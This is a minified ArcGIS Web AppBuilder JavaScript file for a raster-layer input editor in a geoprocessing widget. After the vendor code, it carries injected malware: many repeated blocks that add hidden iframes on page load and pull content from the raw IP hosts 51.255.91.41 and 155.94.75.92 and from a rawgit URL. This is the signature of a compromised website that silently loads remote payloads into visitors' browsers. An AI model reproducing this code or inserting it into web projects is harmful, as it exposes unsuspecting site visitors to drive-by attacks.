// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

require({cache:{"url:widgets/Geoprocessing/editors/RasterLayerEditor.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"modeSelection" style\x3d"display:none"\x3e\r\n    \x3cdiv class\x3d"field"\x3e\r\n      \x3cinput name\x3d"rasterDataMode" type\x3d"radio" data-dojo-attach-point\x3d"urlMode"\r\n        data-dojo-attach-event\x3d"onclick: _onUrlModeSelect" style\x3d"font-size: 10px;"\r\n        class\x3d"jimu-leading-margin10 jimu-radio-btn"\x3e\x3clabel style\x3d"width: auto;" class\x3d"jimu-leading-margin025"\x3e${nls.useUrlForGPInput}\x3c/label\x3e\r\n      \x3cinput name\x3d"rasterDataMode" type\x3d"radio" data-dojo-attach-point\x3d"itemMode"\r\n        style\x3d"font-size: 10px;" data-dojo-attach-event\x3d"onclick: _onItemModeSelect"\r\n        class\x3d"jimu-leading-margin2 jimu-radio-btn"\x3e\x3clabel style\x3d" width: auto;" class\x3d"jimu-leading-margin025"\x3e${nls.useUploadForGPInput}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"settingNode"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"urlNode" data-dojo-props\x3d"label:urlNode"\x3e\r\n        \x3ctable\x3e\r\n          \x3ctr\x3e\r\n            \x3ctd\x3e\x3clabel title\x3d"${nls.rasterFormat}"\x3e${nls.rasterFormat}\x3c/label\x3e\x3c/td\x3e\r\n            \x3ctd\x3e\x3cinput type\x3d"text" data-dojo-attach-point\x3d"rasterFormatInput"\r\n                data-dojo-type\x3d"dijit/form/TextBox" class\x3d"common-input"/\x3e\x3c/td\x3e\r\n          \x3c/tr\x3e\r\n          \x3ctr\x3e\r\n            \x3ctd\x3e\x3clabel title\x3d"${nls.url}"\x3e${nls.url}\x3c/label\x3e\x3c/td\x3e\r\n            \x3ctd\x3e\r\n            \x3cinput data-dojo-type\x3d"jimu/dijit/URLInput" data-dojo-props\x3d"rest:false"\r\n              data-dojo-attach-point\x3d"urlEditor" class\x3d"common-input"\x3e\x3c/td\x3e\r\n          \x3c/tr\x3e\r\n        \x3c/table\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"fileNode" data-dojo-props\x3d"label:fileNode"\x3e\r\n        \x3cdiv\x3e\r\n          \x3cform data-dojo-attach-point\x3d"fileForm"\r\n                enctype\x3d"multipart/form-data"\r\n                method\x3d"POST" data-dojo-type\x3d"dijit/form/Form"\x3e\r\n            \x3cinput id\x3d"${uniqueID}_raster" type\x3d"file" multiple\x3d"false" name\x3d"file"\r\n              data-dojo-attach-point\x3d"fileInput" style\x3d"display:none"\r\n              data-dojo-attach-event\x3d"onChange: _onUpload"/\x3e\r\n            \x3cdiv class\x3d"jimu-btn jimu-leading-margin10 jimu-float-leading"\x3e\r\n              \x3clabel class\x3d"file-input-label" for\x3d"${uniqueID}_raster"\x3e\r\n                ${nls.selectFileToUpload}\r\n              \x3c/label\x3e\r\n            \x3c/div\x3e\r\n            \x3cinput type\x3d"hidden" name\x3d"f" value\x3d"json"/\x3e\r\n          \x3c/form\x3e\r\n          \x3cspan data-dojo-attach-point\x3d"uploadFileName" class\x3d"jimu-leading-margin2"\x3e\x3c/span\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/dom-style dojo/dom-attr dojo/on dojo/Deferred dojo/text!./RasterLayerEditor.html dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin esri/tasks/RasterData esri/request jimu/dijit/ViewStack jimu/dijit/Message ../BaseEditor dijit/form/TextBox jimu/dijit/URLInput".split(" "),function(h,e,k,d,c,f,l,m,n,p,q,r,t,g,u){return h([u,n,p],{baseClass:"jimu-gp-editor-base jimu-gp-editor-wrapper",templateString:m,editorName:"RasterLayerEditor",mode:"url",
_url:"",_format:"",_itemID:null,uniqueID:null,constructor:function(){this.inherited(arguments);this.uniqueID=(new Date).getTime()},postCreate:function(){this.inherited(arguments);this.value&&this.parseDefaultValue();c.set(this.urlEditor,"tooltip",this.param.tooltip);"setting"===this.context?(this.viewStack=null,d.set(this.fileNode,"display","none")):(this.viewStack=new t({viewType:"dom",views:[this.urlNode,this.fileNode]}),this.viewStack.placeAt(this.settingNode),this.viewStack.startup());this.config.serverInfo.supportsUpload&&
d.set(this.modeSelection,"display","");"item"===this.mode&&this.config.serverInfo.supportsUpload?(c.set(this.itemMode,"checked",!0),f.emit(this.itemMode,"click",{cancelable:!0,bubble:!0})):(c.set(this.urlMode,"checked",!0),f.emit(this.urlMode,"click",{cancelable:!0,bubble:!0}),this.rasterFormatInput.set("value",this._format),this.urlEditor.set("value",this._url))},parseDefaultValue:function(){var b;if(0===this.value.indexOf("itemID:"))this.mode="item";else{if(0===this.value.indexOf("url:")||0===this.value.indexOf("format:"))b=
this.value.split(","),k.forEach(b,function(a){0===a.indexOf("url:")?this._url=a.substring(4):a.indexOf(!1)&&(this._format=a.substring(7))},this);this.mode="url"}},hasValidValue:function(){if("item"===this.mode)return!0;if("url"===this.mode)return this.urlEditor.isValid()},getValue:function(){return"url"===this.mode?"url:"+this._getUrl()+",format:"+this.rasterFormatInput.get("value"):"item"===this.mode?"itemID:":""},getGPValue:function(){var b=new l,a=new q;"url"===this.mode?(a.url=this._getUrl(),
a.format=this.rasterFormatInput.get("value")):a.itemID=this.itemIDInput;a.url||a.itemID?b.resolve(a):b.resolve(null);return b},_getUrl:function(){return this.urlEditor.isValid()?this.urlEditor.get("value"):""},_onUrlModeSelect:function(){this.mode="url";this.viewStack?this.viewStack.switchView(0):d.set(this.urlNode,"display","block")},_onItemModeSelect:function(){this.mode="item";this.viewStack?this.viewStack.switchView(1):d.set(this.urlNode,"display","none")},_onUpload:function(){if(c.get(this.fileInput,
"value")){var b=c.get(this.fileInput,"value"),b=b.replace(/\\/g,"/"),b=b.substr(b.lastIndexOf("/")+1);r({url:this.config.serverInfo.url+"uploads/upload",form:this.fileForm.domNode,handleAs:"json"}).then(e.hitch(this,function(a){a.success&&(this.itemIDInput=a.item.itemID,c.set(this.fileInput,"value",""),c.set(this.uploadFileName,"innerHTML",b),new g({message:this.nls.uploadSuccess}))}),e.hitch(this,function(a){new g({message:a.message||a})}))}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});